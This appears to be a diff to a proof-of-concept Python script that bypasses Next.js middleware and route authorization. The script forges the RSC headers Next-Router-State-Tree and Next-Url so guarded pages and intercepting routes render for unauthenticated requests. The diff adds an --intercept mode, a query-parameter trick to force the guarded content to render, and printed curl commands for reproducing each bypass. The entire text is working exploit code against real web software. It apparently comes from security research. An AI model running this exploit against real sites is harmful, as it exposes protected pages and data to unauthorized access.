@@ -7,6 +7,7 @@ auth check inside them. See ../frameworks/next-js.md for the mechanism.
 
 Usage:
     poc/next-js.py <url> [ancestor ...]
+    poc/next-js.py --intercept <public-url> <next-url-path>
     poc/next-js.py --self-test
 
 An ancestor is `segment` (static) or `param=value` (dynamic route segment). With no
@@ -15,12 +16,19 @@ ancestors given, every path segment but the last is claimed as static.
     poc/next-js.py http://127.0.0.1:3011/dashboard/secret
     poc/next-js.py http://localhost:3000/admin/customers/c1/notes admin customers customerId=c1
 
+`--intercept` fetches a public URL with `Next-Url` claiming a middleware-guarded parent,
+so an intercepting route defined under that parent renders while the middleware matcher
+only sees the public path. It reports chunks absent from the plain response.
+
+    poc/next-js.py --intercept http://localhost:3000/pub/1 /admin
+
 Stdlib only. GET requests only, no cookies sent.
 """
 
 import base64
 import hashlib
 import json
+import re
 import sys
 import urllib.error
 import urllib.parse
@@ -29,6 +37,8 @@ import urllib.request
 TIMEOUT = 15
 # Marker Next.js embeds in a Flight payload when a layout/page calls redirect().
 NEXT_REDIRECT = "NEXT_REDIRECT"
+# Query param added to force the claimed __PAGE__ leaf to mismatch (see attempt()).
+LEAF_BUST_PARAM = "_rsf"
 
 
 def build_state_tree(ancestors, leaf_mode="page", tuple_length=4):
@@ -114,6 +124,12 @@ def attempt(url, ancestors, leaf_mode, tuple_length, key_mode):
 
     parts = urllib.parse.urlsplit(url)
     query = urllib.parse.parse_qsl(parts.query)
+    # The claimed leaf carries empty props ({}), so a request whose query string also
+    # matches means the leaf matches too — the server then treats the whole claimed
+    # subtree INCLUDING the leaf as already client-cached and returns an empty diff.
+    # An extra param forces the leaf to mismatch and render fresh. Safe to always add:
+    # the _rsc key is derived from headers only, never from the query string.
+    query.append((LEAF_BUST_PARAM, "1"))
     query.append(("_rsc", key))
     forged = urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(query)))
 
@@ -125,8 +141,41 @@ def attempt(url, ancestors, leaf_mode, tuple_length, key_mode):
         status == 200
         and "text/x-component" in headers.get("content-type", "")
         and NEXT_REDIRECT not in body
+        # An empty diff satisfies every check above while disclosing nothing.
+        and bool(body.strip())
     )
     return ok, forged, state_tree, next_url, status, body
+
+
+CHUNK_RE = re.compile(r"(?:_next/)?static/chunks/[a-zA-Z0-9._\-/~]+\.js")
+
+
+def extract_chunks(body):
+    """`static/chunks/*.js` refs in a body, normalized to `_next/...` so both spellings compare equal."""
+    return {m if m.startswith("_next/") else "_next/" + m for m in CHUNK_RE.findall(body)}
+
+
+def new_chunks(baseline_body, body):
+    return sorted(extract_chunks(body) - extract_chunks(baseline_body))
+
+
+def intercept(url, next_url):
+    print(f"[*] public:   {url}")
+    print(f"[*] Next-Url: {next_url}")
+    status, _, plain = get(url)
+    print(f"[*] baseline: {status}")
+    if status is None:
+        return 1
+    st, _, body = get(url, {"Next-Url": next_url})
+    fresh = new_chunks(plain, body) if st and 200 <= st < 300 else []
+    if not fresh:
+        print(f"[!] no new chunks (status={st}) — no intercepting route for this pair, or the guard didn't match")
+        return 1
+    print(f"\n[+] INTERCEPT — {len(fresh)} chunk(s) only served with Next-Url\n")
+    print(f"curl -s '{url}' \\\n  -H 'Next-Url: {next_url}'\n")
+    for c in fresh:
+        print(f"    {c}")
+    return 0
 
 
 def parse_ancestor(arg):
@@ -155,6 +204,12 @@ def self_test():
     assert strong_key("tree", "/dashboard") != strong_key("tree", "/other")
     assert legacy_key("tree", "/dashboard") != strong_key("tree", "/dashboard")
     assert len(legacy_key("tree", "/dashboard")) <= 5
+    # Chunk refs: Flight omits `_next/`, HTML includes it; both are the same chunk.
+    assert extract_chunks('["static/chunks/a.js"] <script src="/_next/static/chunks/a.js">') == {"_next/static/chunks/a.js"}
+    assert new_chunks("static/chunks/a.js", "_next/static/chunks/a.js static/chunks/app/admin/b~1.js") == [
+        "_next/static/chunks/app/admin/b~1.js"
+    ]
+    assert new_chunks("static/chunks/a.js", "static/chunks/a.js") == []
     print("[+] self-test passed")
 
 
@@ -166,6 +221,11 @@ def main():
     if args[0] == "--self-test":
         self_test()
         return 0
+    if args[0] == "--intercept":
+        if len(args) != 3:
+            print(__doc__)
+            return 1
+        return intercept(args[1], args[2])
 
     url = args[0]
     path_segments = [s for s in urllib.parse.urlsplit(url).path.split("/") if s]
@@ -193,7 +253,12 @@ def main():
                 if not ok:
                     print(f"[-] {label}: status={st}")
                     continue
-                print(f"\n[+] BYPASS ({label})\n")
+                kind = "BYPASS — full body" if leaf_mode == "page" else "WEAK BYPASS — metadata only"
+                print(f"\n[+] {kind} ({label})\n")
+                if leaf_mode == "metadata-only":
+                    print("    Narrower disclosure: generateMetadata() output, not the page body.")
+                    print("    If the route defines no generateMetadata, this leaks nothing")
+                    print("    sensitive — try a more specific ancestor claim before trusting it.\n")
                 print(f"curl -sL '{forged}' \\\n  -H 'RSC: 1' \\\n  -H 'Next-Router-State-Tree: {tree}' \\\n  -H 'Next-Url: {next_url}'\n")
                 print(body)
                 return 0
